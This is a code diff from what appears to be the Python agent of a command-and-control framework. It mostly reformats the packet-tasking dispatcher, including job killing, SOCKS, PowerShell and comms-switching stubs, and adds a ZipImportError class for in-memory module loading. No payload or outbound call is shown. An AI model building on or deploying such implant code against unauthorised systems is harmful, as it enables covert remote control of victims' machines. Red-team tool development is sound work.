@@ -397,8 +397,11 @@ def process_packet(packetType, data, resultID):
 
     elif packetType == 44:
         # run csharp module in ironpython using reflection
-        send_message(build_response_packet(60, "[!] C# module execution not implemented", resultID))
-
+        send_message(
+            build_response_packet(
+                60, "[!] C# module execution not implemented", resultID
+            )
+        )
 
     elif packetType == 50:
         # return the currently running jobs
@@ -413,15 +416,27 @@ def process_packet(packetType, data, resultID):
         try:
             jobs[int(data)].kill()
             jobs.pop(int(data))
-            send_message(build_response_packet(51, "[+] Job thread %s stopped successfully" % (data), resultID))
+            send_message(
+                build_response_packet(
+                    51, "[+] Job thread %s stopped successfully" % (data), resultID
+                )
+            )
         except Exception as e:
-            send_message(build_response_packet(51, "[!] Error stopping job thread: %s" % (e), resultID))
+            send_message(
+                build_response_packet(
+                    51, "[!] Error stopping job thread: %s" % (e), resultID
+                )
+            )
 
     elif packetType == 60:
-        send_message(build_response_packet(60, "[!] SOCKS server not implemented", resultID))
+        send_message(
+            build_response_packet(60, "[!] SOCKS server not implemented", resultID)
+        )
 
     elif packetType == 61:
-        send_message(build_response_packet(0, "[!] SOCKS server data not implemented", resultID))
+        send_message(
+            build_response_packet(0, "[!] SOCKS server data not implemented", resultID)
+        )
 
     elif packetType == 100:
         # dynamic code execution, wait for output, don't save output
@@ -534,11 +549,15 @@ def process_packet(packetType, data, resultID):
 
     elif packetType == 112:
         # powershell task
-        send_message(build_response_packet(60, "[!] PowerShell tasks not implemented", resultID))
+        send_message(
+            build_response_packet(60, "[!] PowerShell tasks not implemented", resultID)
+        )
 
     elif packetType == 118:
         # PowerShel Task - dynamic code execution, wait for output, don't save output
-        send_message(build_response_packet(60, "[!] PowerShell tasks not implemented", resultID))
+        send_message(
+            build_response_packet(60, "[!] PowerShell tasks not implemented", resultID)
+        )
 
     elif packetType == 119:
         pass
@@ -643,11 +662,19 @@ def process_packet(packetType, data, resultID):
 
     elif packetType == 130:
         # Dynamically update agent comms
-        send_message(build_response_packet(60, "[!] Switch agent comms not implemented", resultID))
+        send_message(
+            build_response_packet(
+                60, "[!] Switch agent comms not implemented", resultID
+            )
+        )
 
     elif packetType == 131:
         # Update the listener name variable
-        send_message(build_response_packet(60, "[!] Switch agent comms not implemented", resultID))
+        send_message(
+            build_response_packet(
+                60, "[!] Switch agent comms not implemented", resultID
+            )
+        )
 
     else:
         send_message(
@@ -676,6 +703,16 @@ def old_div(a, b):
 # [0] = .py ext, is_package = False
 # [1] = /__init__.py ext, is_package = True
 _search_order = [(".py", False), ("/__init__.py", True)]
+
+
+class ZipImportError(ImportError):
+    """Exception raised by zipimporter objects."""
+
+    pass
+
+
+# _get_info() = takes the fullname, then subpackage name (if applicable),
+# and searches for the respective module or package
 
 
 class CFinder(object):
